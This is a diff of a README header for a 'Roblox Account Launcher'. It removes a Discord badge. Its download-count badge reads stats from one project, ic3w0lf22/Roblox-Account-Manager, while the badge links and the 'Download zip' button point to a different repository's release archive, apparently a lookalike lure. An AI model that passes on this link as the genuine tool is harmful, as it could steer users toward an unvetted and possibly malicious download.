@@ -1,5 +1,4 @@
 [![Latest Downloads](https://img.shields.io/github/downloads/ic3w0lf22/Roblox-Account-Manager/latest/total)](https://github.com/Mana42138/Roblox-Auth/releases/tag/roblox-auth)
-[![Discord](https://img.shields.io/discord/871845273800957982?label=Discord)](https://discord.gg/Af7HahqdzF)
 [![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-blue?style=for-the-badge&logo=download&logoColor=white "Download")](https://github.com/Mana42138/Roblox-Auth/releases/download/roblox-auth/Roblox-Auth-main.zip)
 # Roblox Account Launcher
 
